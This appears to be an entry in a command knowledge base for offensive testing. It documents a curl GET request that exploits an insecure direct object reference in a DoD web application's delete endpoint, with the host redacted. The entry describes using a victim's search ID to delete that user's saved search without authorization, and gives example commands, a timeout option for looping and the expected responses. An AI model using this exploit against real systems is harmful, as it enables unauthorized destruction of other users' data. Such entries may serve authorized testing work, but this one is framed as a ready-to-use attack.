---
data: >-
  curl -X GET "https://████/█████/████████={search_id}" -H "Cookie:
  session=your_auth_cookie" -v
tags:
  - web
  - exploit
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.084Z'
id: a88927e1-f9a7-4bf5-8081-f90a103fec2f
verified: false
validated: true
submitted: true
---
# curl-delete-saved-search

## Command

```bash
curl -X GET "https://████/█████/████████={search_id}" -H "Cookie: session=your_auth_cookie" -v
```

## Description

This command sends a modified GET request to the DoD web app's delete endpoint, exploiting IDOR by using a victim-provided {search_id} to unauthorizedly delete a saved search. Use it after capturing the base URL and obtaining a valid session cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{search_id}` | The ID of the target saved search to delete (replace with victim's ID) | Yes |
| `-H "Cookie: session=your_auth_cookie"` | Authentication cookie for the session | Yes |
| `-v` | Verbose output to show response details | No |
| `--max-time 5` | Timeout for each request (useful in loops) | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://████/█████/████████=123" -H "Cookie: session=abc123" -v
```

### Advanced Usage (with Timeout)

```bash
curl -X GET "https://████/█████/████████=456" -H "Cookie: session=abc123" -v --max-time 5
```

## Expected Output

Successful execution returns an HTTP 200 OK response with a success message or empty body indicating deletion. Verbose mode shows headers; look for no 403 Forbidden. Failure may show 404 if ID invalid or 500 if rate-limited.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-by-Modifying-Search-ID]]
